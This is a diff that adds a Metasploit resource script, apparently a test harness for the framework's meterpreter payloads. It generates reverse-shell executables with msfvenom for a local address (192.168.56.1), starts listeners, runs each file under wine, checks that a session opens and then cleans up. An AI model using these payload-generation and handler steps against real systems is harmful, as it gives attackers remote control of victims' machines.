@@ -1,0 +1,120 @@
+<ruby>
+
+$base = "/Users/bcook/projects/metasploit-framework"
+$host = "192.168.56.1"
+$port = 4444
+
+options = {
+  'LHOST' => $host,
+  'LPORT' => $port,
+  'RHOST' => $host,
+  'EXTENSIONS' => 'stdapi,priv'
+}
+
+payloads = [
+  'windows/meterpreter_reverse_tcp',
+  'windows/meterpreter_reverse_https',
+  'windows/meterpreter/reverse_tcp',
+  'windows/meterpreter/reverse_http',
+  'windows/meterpreter/reverse_https',
+
+  'python/meterpreter_reverse_tcp',
+  'python/meterpreter_reverse_http',
+  'python/meterpreter_reverse_https',
+
+  'php/meterpreter_reverse_tcp',
+  'python/meterpreter_reverse_http',
+  'python/meterpreter_reverse_https',
+
+  'windows/meterpreter_reverse_https',
+  'windows/meterpreter/reverse_tcp',
+  'windows/meterpreter/reverse_http',
+  'windows/meterpreter/reverse_https',
+  #'windows/meterpreter_bind_tcp',
+  #'windows/meterpreter/bind_tcp',
+  #windows/x64/meterpreter/reverse_tcp',
+  #windows/x64/meterpreter/reverse_https',
+  #windows/x64/meterpreter_reverse_tcp',
+  #windows/x64/meterpreter_bind_tcp',
+  #windows/x64/meterpreter_reverse_https',
+]
+# 'windows/meterpreter_reverse_ipv6_tcp'
+
+def generate_exe(dst, payload, options, small)
+  ostr = ""
+  options.each_pair do |k,v|
+    ostr << "#{k}=#{v} "
+  end
+  estr = "#{$base}/msfvenom -f exe -p #{payload} -o #{dst} #{ostr}"
+  if small
+    estr << " -s 100"
+  end
+
+  print_status("Running #{estr}...")
+  system(estr)
+end
+
+def setup_handler(payload, options)
+  print_status("Setting up handler for #{payload}...")
+  run_single("use exploit/multi/handler")
+  run_single("set PAYLOAD #{payload}")
+  options.each_pair do |k,v|
+    run_single("set #{k} #{v}")
+  end
+  run_single("run -j")
+end
+
+def verify_session
+  print_status("Waiting for session...")
+  max = 10
+  loop do
+    break if framework.sessions.keys.length > 0
+	#print_status("waiting... #{framework.sessions.keys.length}")
+    sleep(1)
+	max -= 1
+	if max == 0
+		break
+	end
+  end
+  print_status("Verifying session...")
+
+  if framework.sessions.keys.length > 0
+	  s = framework.sessions.first[1]
+	  sleep(2)
+	  info = nil
+	  while (! info)
+		info = s.sys.config.sysinfo rescue nil
+		sleep(0.5)
+	  end
+
+	  print_status("System information: #{info.inspect}")
+  else
+	  print_error("Session failed")
+  end
+end
+
+def cleanup
+  print_status("Cleaning up...")
+  run_single("sessions -K")
+  run_single("jobs -K")
+end
+
+def run_wine(dst)
+  system("WINEDEBUG=-all wine #{dst} &")
+end
+
+payloads.each do |payload|
+
+	options['LPORT'] = options['LPORT'].to_i + 1
+	small = false
+	dst = "/tmp/" + payload.gsub("/", "-") + ".exe"
+	generate_exe(dst, payload, options, small)
+	setup_handler(payload, options)
+	run_wine(dst)
+	verify_session()
+	cleanup()
+end
+
+run_single("exit -y")
+
+</ruby>
